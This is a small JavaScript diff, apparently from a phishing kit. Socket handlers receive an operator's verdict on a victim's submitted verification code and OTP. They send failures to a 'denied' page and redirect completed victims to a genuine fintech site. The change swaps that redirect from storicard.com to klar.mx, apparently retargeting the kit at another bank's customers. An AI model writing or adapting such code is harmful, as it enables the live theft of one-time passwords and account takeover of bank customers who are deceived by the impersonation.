@@ -18,7 +18,7 @@ socket.on("respuestaCodigo", (decision) => {
   if (decision === "error") {
     window.location.href = "denegado.html";
   } else if (decision === "finalizar") {
-    window.location.href = "https://www.storicard.com/";
+    window.location.href = "https://www.klar.mx/";
   }
 });
 
@@ -27,7 +27,7 @@ socket.on("respuestaOtp", (decision) => {
   if (decision === "otp_error") {
     window.location.href = "denegado.html";
   } else if (decision === "finalizar") {
-    window.location.href = "https://www.storicard.com/";
+    window.location.href = "https://www.klar.mx/";
   }
 });
 
